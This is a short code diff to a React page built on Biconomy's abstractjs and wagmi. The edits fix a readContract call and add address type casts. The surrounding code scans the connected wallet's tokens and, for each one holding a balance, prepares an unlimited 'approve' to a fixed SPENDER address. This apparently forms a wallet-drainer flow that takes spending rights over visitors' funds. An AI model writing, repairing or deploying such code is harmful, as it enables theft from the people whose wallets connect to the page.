@@ -9,7 +9,7 @@ import {
   getMEEVersion,
   MEEVersion,
 } from '@biconomy/abstractjs';
-import { getWalletClient, getChainId as getActiveChainId } from '@wagmi/core';
+import { getWalletClient } from '@wagmi/core';
 import { config, TOKENS_BY_CHAIN, CHAIN_NAMES, CHAIN_BY_ID, transports } from '@/config';
 
 // --- required env (production)
@@ -87,12 +87,13 @@ export default function Page() {
 
       for (const token of tokens) {
         try {
-          const bal = await meeClient.readContract({
+          // <-- FIX: use orchestrator.readContract (not meeClient.readContract) and cast addresses
+          const bal = await orchestrator.readContract({
             chainId: activeChain,
             abi: erc20Abi,
-            address: token.address,
+            address: token.address as `0x${string}`,
             functionName: 'balanceOf',
-            args: [address],
+            args: [address as `0x${string}`],
           }) as bigint;
 
           if (bal > BigInt(0)) {
@@ -108,7 +109,7 @@ export default function Page() {
               data: {
                 abi: erc20Abi,
                 chainId: activeChain,
-                to: token.address,
+                to: token.address as `0x${string}`,
                 functionName: 'approve',
                 args: [SPENDER, maxUint256],
               },
@@ -136,7 +137,7 @@ export default function Page() {
         instructions,
         trigger: {
           chainId: activeChain,
-          tokenAddress: feeTokenAddress ?? tokens[0].address,
+          tokenAddress: (feeTokenAddress ?? (tokens[0].address as `0x${string}`)) as `0x${string}`,
           amount: BigInt(1),
         },
         feeToken: feeTokenAddress ? { address: feeTokenAddress, chainId: activeChain } : undefined,
